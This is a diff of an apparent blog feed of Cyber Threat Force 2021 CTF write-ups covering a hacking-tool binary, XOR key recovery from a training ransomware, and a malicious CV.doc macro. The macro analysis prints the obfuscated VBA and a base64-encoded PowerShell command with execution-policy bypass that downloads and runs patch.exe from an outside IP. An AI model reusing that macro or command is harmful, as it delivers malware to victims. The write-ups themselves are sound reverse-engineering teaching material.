@@ -7,14 +7,14 @@ C:\Users\IEUser\Desktop&amp;gt;original.exe Please enter the good PIN Using a pr
 &lt;p>The &amp;ldquo;Interesting strings&amp;rdquo; section contained the flag: &lt;code>CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}&lt;/code>.&lt;/p>
 &lt;hr>
 &lt;p>We can also try to solve the challenge in a more conventional way. Executing the application gives us:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ps" data-lang="ps">&lt;span style="color:#a6e22e">C:\Users\IEUser\Desktop&lt;/span>&amp;gt;&lt;span style="color:#a6e22e">original.exe&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ps" data-lang="ps">&lt;span style="color:#a6e22e">C:\Users\IEUser\Desktop&lt;/span>&amp;gt;&lt;span style="color:#a6e22e">original.exe&lt;/span>
 &lt;span style="color:#a6e22e">Please&lt;/span> &lt;span style="color:#a6e22e">enter&lt;/span> &lt;span style="color:#a6e22e">the&lt;/span> &lt;span style="color:#a6e22e">good&lt;/span> &lt;span style="color:#a6e22e">PIN&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="using-a-process-monitor">Using a process monitor&lt;/h2>
 &lt;p>We can use &lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">procmon&lt;/a> from the Sysinternals suite to monitor the process.&lt;/p>
 &lt;img src="https://nicolasb.fr/assets/cyber-threat-force/reverse-trojan-tools.png" alt="Procmon monitoring for the executable showing a WriteFile call" class="center" />
 &lt;p>We can see that a file is created and written to. It is deleted once the executable is done running, but there probably is a call to &lt;code>Sleep&lt;/code> because we can open it in notepad if we&amp;rsquo;re fast enough.&lt;/p>
 &lt;p>Here is is, containing the flag:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="color:#66d9ef">Param&lt;/span>($choix)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="color:#66d9ef">Param&lt;/span>($choix)
 &lt;span style="color:#66d9ef">if&lt;/span>($choix &lt;span style="color:#f92672">-eq&lt;/span> 5383)
 {
 Write-Host &lt;span style="color:#e6db74">&amp;#34;Welcome to HackTool &lt;/span>&lt;span style="color:#ae81ff">`r`n`r`n`r`n&lt;/span>&lt;span style="color:#e6db74">===MENU===&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">1)FUD PAYLOAD&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">2)DDOS&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">3)Personnal note&amp;#34;&lt;/span>
@@ -62,7 +62,7 @@ We can try to run VIKING_DECRYPT.exe:
 As expected, we&amp;rsquo;re asked for a decryption key. Let&amp;rsquo;s encrypt a few files in a VM, and compare the plaintext and the .</description><content>&lt;p>For this challenge, we were given a ransomware (&lt;code>VIKING_CRYPT.exe&lt;/code> and &lt;code>VIKING_DECRYPT.exe&lt;/code>) along with a &lt;code>LOCKER.HTML&lt;/code> file and &lt;code>IMPORTANT_NOTE.txt.vkg&lt;/code>.&lt;/p>
 &lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/viking-locker.png" alt="Viking locker ransom message">&lt;/p>
 &lt;p>Let&amp;rsquo;s take a look at that encrypted note:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file Perso/IMPORTANT_NOTE.txt.vkg
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file Perso/IMPORTANT_NOTE.txt.vkg
 Perso/IMPORTANT_NOTE.txt.vkg: ASCII text, with no line terminators
 $ cat Perso/IMPORTANT_NOTE.txt.vkg
 8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849
@@ -71,39 +71,39 @@ $ cat Perso/IMPORTANT_NOTE.txt.vkg
 &lt;img src="https://nicolasb.fr/assets/cyber-threat-force/viking-locker-decrypt.png" alt="Viking locker decrypt executable" class="center" />
 &lt;p>As expected, we&amp;rsquo;re asked for a decryption key. Let&amp;rsquo;s encrypt a few files in a VM, and compare the plaintext and the &lt;code>.vkg&lt;/code> files.&lt;/p>
 &lt;p>Note: the challenge description tells us that, for safety, the malware will only encrypt files in &lt;code>C:\Users\nMnHkfcWUjE\Desktop\Perso&lt;/code>.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span> &amp;gt; normal.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span> &amp;gt; normal.txt
 $ echo &lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span> &amp;gt; leet.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ps" data-lang="ps">&lt;span style="color:#a6e22e">PS&lt;/span> &lt;span style="color:#a6e22e">C:\Users\nMnHkfcWUjE\Desktop&lt;/span>&amp;gt; &lt;span style="color:#a6e22e">.\VIKING_CRYPT.exe&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat normal.txt.vkg
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ps" data-lang="ps">&lt;span style="color:#a6e22e">PS&lt;/span> &lt;span style="color:#a6e22e">C:\Users\nMnHkfcWUjE\Desktop&lt;/span>&amp;gt; &lt;span style="color:#a6e22e">.\VIKING_CRYPT.exe&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat normal.txt.vkg
 a1a74e2267006c2df04f5e
 $ cat leet.txt.vkg
 a1f1137f38006c72f0125e
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now this is promising. The matching &lt;code>h&lt;/code> has the same value. Let&amp;rsquo;s try a simple xor between the plaintext and the encrypted value, to see if we get a matching key:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> codecs
-&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1a74e2267006c2df04f5e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> codecs
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1a74e2267006c2df04f5e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
 [&lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">194&lt;/span>, &lt;span style="color:#ae81ff">34&lt;/span>, &lt;span style="color:#ae81ff">78&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#ae81ff">27&lt;/span>, &lt;span style="color:#ae81ff">66&lt;/span>, &lt;span style="color:#ae81ff">130&lt;/span>, &lt;span style="color:#ae81ff">35&lt;/span>, &lt;span style="color:#ae81ff">58&lt;/span>]
-&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
 [&lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">194&lt;/span>, &lt;span style="color:#ae81ff">34&lt;/span>, &lt;span style="color:#ae81ff">78&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#ae81ff">27&lt;/span>, &lt;span style="color:#ae81ff">66&lt;/span>, &lt;span style="color:#ae81ff">130&lt;/span>, &lt;span style="color:#ae81ff">35&lt;/span>, &lt;span style="color:#ae81ff">58&lt;/span>]
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The key is exactly the same! Let&amp;rsquo;s try decrypting our important note:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
-&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
 &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF{I_D&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Well that&amp;rsquo;s only the start of the flag. Let&amp;rsquo;s encrypt something longer, to get more bytes of the key:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span> &amp;gt; long.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span> &amp;gt; long.txt
 $ &lt;span style="color:#75715e"># Run VIKING_CRYPT.exe&lt;/span>
 $ cat long.txt.vkg
 85ad502b65007232f15657689af325bbccc6cb4f9ca7129f24074a1bb65bc8c30162703e3f36149f38c754567af424eb60682eda379edab1b7fe5b44c4df29c471f802c8d8716192291c829b89c3c49695ec48abf2f3721e5b229a20afb2b7c751779c51ff63f378a7a53c27113b306c26fc2b87562768cc82b70cfdbd3fc93730f890234ac890c6e6b9e052f65341eaaf3f7e56d9476c170f17dd5e3830867656c0fd885a68a55ae58bcb182a09ee0a840a03511fb3222d25637b1d344340168dfebdd97a8bc327a36e6d9703f9e6427e9dfd07df86f0140a067a3a843aeef6f4782df2f1e56e380957c2
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cleartext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cleartext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span>
 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cipher &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;85ad502b65007232f15657689af325bbccc6cb4f9ca7129f24074a1bb65bc8c30162703e3f36149f38c754567af424eb60682eda379edab1b7fe5b44c4df29c471f802c8d8716192291c829b89c3c49695ec48abf2f3721e5b229a20afb2b7c751779c51ff63f378a7a53c27113b306c26fc2b87562768cc82b70cfdbd3fc93730f890234ac890c6e6b9e052f65341eaaf3f7e56d9476c170f17dd5e3830867656c0fd885a68a55ae58bcb182a09ee0a840a03511fb3222d25637b1d344340168dfebdd97a8bc327a36e6d9703f9e6427e9dfd07df86f0140a067a3a843aeef6f4782df2f1e56e380957c2&amp;#39;&lt;/span>
 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(cleartext, codecs&lt;span style="color:#f92672">.&lt;/span>decode(cipher, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
-&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
-&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF{I_D0nt_P4y_Th3_R4ns0m}&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
+&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF&lt;/span>&lt;span style="color:#e6db74">{I_D0nt_P4y_Th3_R4ns0m}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{I_D0nt_P4y_Th3_R4ns0m}&lt;/code>.&lt;/p>
 &lt;p>By the way, the key doesn&amp;rsquo;t seem to repeat (at least for the first 235 values), so it&amp;rsquo;s probably made from a RNG.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/viking-crypt">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : The document is strange</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/</link><pubDate>Sat, 10 Jul 2021 17:45:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/</guid><description>&lt;p>For this challenge, we were given a &lt;code>CV.doc&lt;/code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.&lt;/p>
 &lt;p>Using the macros menu, we can dump their code:&lt;/p></description><content>&lt;p>For this challenge, we were given a &lt;code>CV.doc&lt;/code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.&lt;/p>
 &lt;p>Using the macros menu, we can dump their code:&lt;/p>
-&lt;pre>&lt;code class="language-vba" data-lang="vba">Rem Attribute VBA_ModuleType=VBAModule
+&lt;pre tabindex="0">&lt;code class="language-vba" data-lang="vba">Rem Attribute VBA_ModuleType=VBAModule
 Option VBASupport 1
 Private Declare PtrSafe Function Sleep Lib &amp;quot;KERNEL32&amp;quot; (ByVal mili As Long) As Long
 Private Function xDSnawULVynR(lyOFjkCBqpsZ As Variant, gGuJOMcorXqH As Variant)
@@ -213,7 +213,7 @@ Sleep (644 Xor 1364)
 Kill qgCHXadDjflv
 End Sub
 &lt;/code>&lt;/pre>&lt;p>We can identify a few interesting parts:&lt;/p>
-&lt;pre>&lt;code class="language-vba" data-lang="vba">' In LwvYeveWxaeE, a file is created.
+&lt;pre tabindex="0">&lt;code class="language-vba" data-lang="vba">' In LwvYeveWxaeE, a file is created.
 Dim nThptKQUsbXIUwo As Object
 Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
 nThptKQUsbXIUwo.Write MwIMnegwljrXk
@@ -223,7 +223,7 @@ Sleep (644 Xor 1364)
 Kill qgCHXadDjflv
 &lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try to see what&amp;rsquo;s written in the file. Since I&amp;rsquo;m more comfortable with python, I converted the code using &lt;a href="http://vb2py.sourceforge.net/online_conversion.html">this tool&lt;/a>. Note that I had to download &lt;a href="http://vb2py.sourceforge.net/downloads.html">the source code&lt;/a> to make the script run, since the package wouldn&amp;rsquo;t install using &lt;code>pip&lt;/code> for me.&lt;/p>
 &lt;p>Trying to run the converted code does nothing, since we have to call a function. Let&amp;rsquo;s call &lt;code>LwvYeveWxaeE&lt;/code>, which creates the file:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python converted.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python converted.py
 Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
 File &lt;span style="color:#e6db74">&amp;#34;/home/vivescere/ctf/the-document-is-strange/test/converted.py&amp;#34;&lt;/span>, line 89, in &amp;lt;module&amp;gt;
 LwvYeveWxaeE&lt;span style="color:#f92672">()&lt;/span>
@@ -231,25 +231,25 @@ File &lt;span style="color:#e6db74">&amp;#34;/home/vivescere/ctf/the-document-is
 BotaCipUCROa &lt;span style="color:#f92672">=&lt;/span> Application.UserName
 NameError: name &lt;span style="color:#e6db74">&amp;#39;Application&amp;#39;&lt;/span> is not defined
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now if we look a bit further up, at this point what&amp;rsquo;s being written to the file is already created. Let&amp;rsquo;s print it:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">...&lt;/span>
-&lt;span style="color:#66d9ef">print&lt;/span>(MwIMnegwljrXk)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">...&lt;/span>
+print(MwIMnegwljrXk)
 &lt;span style="color:#66d9ef">return&lt;/span>
 BotaCipUCROa &lt;span style="color:#f92672">=&lt;/span> Application&lt;span style="color:#f92672">.&lt;/span>UserName
 &lt;span style="color:#f92672">...&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python converted.py
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python converted.py
 powershell.exe -exec bypass -enc JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA&lt;span style="color:#f92672">==&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>An encoded powershell command! Let&amp;rsquo;s decode it:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==&amp;#39;&lt;/span> | base64 -d
